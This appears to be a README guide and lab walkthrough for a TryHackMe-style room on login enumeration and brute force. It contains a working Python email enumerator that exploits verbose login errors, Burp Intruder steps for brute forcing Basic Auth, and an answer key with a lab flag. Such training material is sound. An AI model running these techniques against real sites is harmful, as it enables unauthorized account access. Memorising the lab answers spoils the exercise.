# Enumeration-BruteForce


# Enumeration & Brute Force 

> A concise guide and hands-on lab covering **authentication enumeration** and **brute force** techniques for web applications. Includes theory, practical examples, automation scripts, and TryHackMe-style lab walk-throughs.

---

## Table of contents

1. [Introduction](#introduction)
2. [Objectives](#objectives)
3. [Prerequisites](#prerequisites)
4. [Getting started (lab setup)](#getting-started-lab-setup)
5. [Authentication enumeration — concepts & places to look](#authentication-enumeration---concepts--places-to-look)
6. [Verbose errors & inducing errors](#verbose-errors--inducing-errors)
7. [Brute forcing basics (incl. Basic Auth demo)](#brute-forcing-basics-incl-basic-auth-demo)
8. [Automation: `script.py` email enumerator (example)](#automation-scriptpy-email-enumerator-example)
9. [Tools & references](#tools--references)
10. [Exercises & answers (spoilers)](#exercises--answers-spoilers)
11. [Contributing / License](#contributing--license)

---

## Introduction

Authentication enumeration is a fundamental aspect of security testing focused on the mechanisms that protect sensitive parts of web applications. It involves methodically inspecting components such as:

* username validation,
* password policies,
* reset workflows,
* and session handling.

Each element is tested because it can leak information that helps an attacker narrow the attack surface. Enumeration often precedes brute force: once valid usernames are discovered, an attacker needs only to guess passwords.

---

## Objectives

By the end of this lab you will:

* Understand why enumeration is critical prior to brute force.
* Learn advanced enumeration methods — especially extracting data from verbose errors.
* See the relationship between enumeration and brute-force attacks.
* Get hands-on practice using tools and scripts for enumeration and brute force.

---

## Prerequisites

You should be comfortable with:

* HTTP/HTTPS basics (requests, responses, status codes).
* Using Burp Suite (or similar proxy).
* Linux command line basics (or the TryHackMe AttackBox).

---

## Getting started (lab setup)

1. Deploy the target VM (or use the AttackBox) and note the machine IP.
2. Add the machine to `/etc/hosts`:

```bash
# example
MACHINE_IP    enum.thm
```

3. Use your AttackBox or your own VM connected to the TryHackMe VPN to interact with the target.

---

## Authentication enumeration — concepts & places to look

Think like a detective: enumeration is about reading clues and inferring what the system does. Common places to enumerate:

* **Registration pages** — “username/email already taken” leaks existence.
* **Password reset forms** — different responses for registered vs unregistered users.
* **Login forms** — verbose messages like “username not found” vs “incorrect password.”
* **Error pages / stack traces** — internal paths, DB names, column names.
* **Past breaches / OSINT** — reused credentials across sites.
* **Public backups / archived pages** (Wayback Machine) or Google Dorks.

---

## Verbose errors & inducing errors

Verbose error messages help developers, but they also help attackers. Examples of information leaks:

* Internal file paths
* Database table/column names
* Distinctions between "user not found" and "wrong password"

**How attackers induce verbose errors**

* Invalid login attempts (observe differences)
* SQL injection probes (single-quote `'` etc.)
* Path traversal attempts (`../../`)
* Tampering hidden form fields
* Fuzzing/unexpected inputs (Burp Intruder, automated fuzzers)

**Defensive note:** Never reveal whether a username exists. Use generic messages like *“If the credentials are correct, you will receive an email”* and rate limit actions.

---

## Brute forcing basics (incl. Basic Auth demo)

### Basic Auth workflow (demo)

* Browser prompts for username/password.
* HTTP request contains: `Authorization: Basic <base64(username:password)>`
* Workflow for brute forcing Basic Auth in Burp:

  * Capture request
  * Send to Intruder
  * Set the decoded `username:password` as the payload position
  * Use payload processing rules:

    1. Prepend username to each password candidate (e.g. `admin:123456`)
    2. Base64-encode payload
    3. Remove padding `=` if necessary
  * Run the attack and look for `200 OK` responses.

**Recommendation:** For automation, use Hydra or sqlmap (for specific protocols) when allowed. Always obtain permission.

---

## Automation: `script.py` — email enumerator example

This python example checks a list of emails against a target application that returns different messages for invalid vs valid email addresses.

> Save as `script.py`

```python
#!/usr/bin/env python3
# script.py — basic email enumerator for verbose-login lab
import requests
import sys

def check_email(session, url, email):
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',
        'function': 'login'
    }
    try:
        r = session.post(url, headers=headers, data=data, timeout=10)
        return r.json()
    except Exception as e:
        print(f"[!] Request failed for {email}: {e}")
        return None

def enumerate_emails(email_file, url):
    valid_emails = []
    invalid_error = "Email does not exist"

    session = requests.Session()
    with open(email_file, 'r') as f:
        for line in f:
            email = line.strip()
            if not email:
                continue
            resp = check_email(session, url, email)
            if not resp:
                continue
            if resp.get('status') == 'error' and invalid_error in resp.get('message', ''):
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)
    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <email_list_file> <target_url>")
        print("Example: python3 script.py usernames_gmail.com.txt 'http://enum.thm/labs/verbose_login/functions.php'")
        sys.exit(1)

    email_file = sys.argv[1]
    target_url = sys.argv[2]
    found = enumerate_emails(email_file, target_url)
    print("\nValid emails found:")
    for e in found:
        print(e)
```

**Run**

```bash
python3 script.py usernames_gmail.com.txt 'http://enum.thm/labs/verbose_login/functions.php'
```

---

## Example: Password policy leak (PHP regex)

If the application echoes the regex or an explicit policy, you can learn complexity requirements:

```php
<?php
$password = $_POST['pass'];
$pattern = '/^(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).+$/';

if (preg_match($pattern, $password)) {
    echo "Password is valid.";
} else {
    echo "Password is invalid. It must contain at least one uppercase letter, one number, and one symbol.";
}
?>
```

If the app returns the regex or a detailed error message, an attacker can craft wordlists that satisfy the policy.

---

## Tools & references

* Burp Suite (proxy, Intruder, Repeater)
* Hydra (protocol brute force)
* SecLists (wordlists)
* waybackurls (OSINT)
* Wayback Machine & Google Dorks (OSINT)

---

## Exercises & answers (spoilers)

<details>
<summary>Answers (click to expand)</summary>

* **What type of error messages can unintentionally provide attackers with confirmation of valid usernames?**
  **Answer:** Verbose errors

* **What is the valid email address from the provided list in the example?**
  **Answer:** `canderson@gmail.com`

* **What is the flag from the Basic Auth lab?**
  **Answer:** `THM{b4$$1C_AuTTHHH}`

